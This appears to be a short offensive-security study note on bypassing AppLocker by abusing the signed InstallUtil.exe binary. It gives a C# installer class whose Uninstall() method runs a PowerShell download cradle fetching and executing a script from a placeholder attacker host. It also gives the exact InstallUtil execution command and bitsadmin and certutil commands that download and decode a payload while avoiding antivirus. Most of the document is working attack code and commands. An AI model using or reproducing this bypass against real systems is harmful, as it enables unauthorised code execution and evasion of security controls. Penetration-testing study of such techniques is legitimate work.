# 07.02 InstallUtil AppLocker Bypass

> Section 8.3.3 · Native .NET tool runs Uninstall() code as non-admin

## Overview

InstallUtil.exe (C:\Windows\Microsoft.NET\Framework64\...) is a signed Microsoft binary whitelisted by AppLocker. It invokes the Uninstall() method (not Install — that requires admin) of a .NET installer class. Place C# payload in the Uninstall() method of a class inheriting from Installer.

## Steps

- **Inherit from Installer** — `class Bypass : System.Configuration.Install.Installer`.
- **Put payload in Uninstall()** — override the method; run custom runspace or shellcode.
- **Add assembly reference** — `System.Configuration.Install` in project.
- **Download + decode** — bitsadmin download → certutil -decode if AV is present.
- **Execute** — `InstallUtil /logfile= /LogToConsole=false /U Bypass.exe`.

## Commands

### C# InstallUtil bypass skeleton

```csharp
using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

[System.ComponentModel.RunInstaller(true)]
public class Bypass : Installer {
    public Bypass() { }
    public static void Main(string[] args) { }

    public override void Uninstall(System.Collections.IDictionary state) {
        // Arbitrary C# code here — e.g. custom runspace + download cradle
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();
        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;
        ps.AddScript("IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/run.ps1')");
        ps.Invoke();
        rs.Close();
    }
}
```

### Execute via InstallUtil

```cmd
REM /U triggers Uninstall() — no admin needed
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe

REM Download+decode pattern (LOTL):
REM bitsadmin /Transfer x http://<LHOST>/Bypass.b64 C:\Windows\Tasks\Bypass.b64
REM certutil -decode C:\Windows\Tasks\Bypass.b64 C:\Windows\Tasks\Bypass.exe
```
